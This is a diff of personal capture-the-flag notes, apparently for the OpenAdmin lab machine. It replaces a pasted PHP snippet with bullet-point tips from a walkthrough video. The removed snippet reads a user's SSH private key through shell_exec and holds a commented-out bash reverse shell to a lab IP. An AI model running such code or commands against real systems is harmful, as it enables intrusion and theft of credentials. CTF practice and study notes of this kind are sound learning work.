@@ -104,17 +104,13 @@ But I'm not able to use the passphrase yettt which is frustrating and a reverse 
 
 
 ## Writeups   
-  
-<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
-# Open Admin Trusted
-# OpenAdmin
-#exec("bash -i >& /dev/tcp/10.10.14.74/1234 0>&1");
-$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
-echo "<pre>$output</pre>";
-?>
-<html>
-<h3>Don't forget your "ninja" password</h3>
-Click here to logout <a href="logout.php" tite = "Logout">Session
-</html>
+
+### ippsec  
+
+* He checked the source of the page to check what is the type of the content management system that is being used.  
+* Carousel is a popular wordpress plugin.  
+* He made an HTML page with `python -m http.server 80` to run the exploit that is expecting us to "make an html page".  
+* Don't jump straight into a dangerous command with command injection, try a simple, useless one first.  
+* 
 
 <!-- tagsss -->
